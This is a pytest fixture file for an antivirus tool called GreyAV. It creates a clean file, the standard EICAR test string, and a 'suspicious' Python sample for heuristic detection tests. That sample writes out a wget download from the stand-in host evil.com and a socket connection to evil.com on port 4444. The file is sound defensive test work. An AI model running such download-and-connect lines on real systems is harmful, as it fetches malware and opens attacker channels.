"""
GreyAV Test Configuration and Fixtures
"""

import pytest
import sys
import tempfile
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))


@pytest.fixture
def temp_dir():
    """Create a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def clean_file(temp_dir):
    """Create a clean test file."""
    file_path = temp_dir / "clean_file.txt"
    file_path.write_text("This is a clean test file with no malicious content.")
    return file_path


@pytest.fixture
def eicar_file(temp_dir):
    """Create an EICAR test file (standard AV test pattern)."""
    file_path = temp_dir / "eicar.txt"
    # EICAR test string - harmless but detected as test malware
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    file_path.write_text(eicar)
    return file_path


@pytest.fixture
def suspicious_file(temp_dir):
    """Create a file with suspicious patterns for heuristic testing."""
    file_path = temp_dir / "suspicious.py"
    content = '''
import subprocess
import socket
import base64

# This contains patterns that should trigger heuristic detection
def suspicious_function():
    subprocess.call(["/bin/sh", "-c", "wget http://evil.com/malware"])
    encoded = base64.b64encode(b"malicious payload")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 4444))
'''
    file_path.write_text(content)
    return file_path


@pytest.fixture
def greyav_instance():
    """Create a GreyAV instance for testing."""
    from greyav import GreyAV
    return GreyAV()
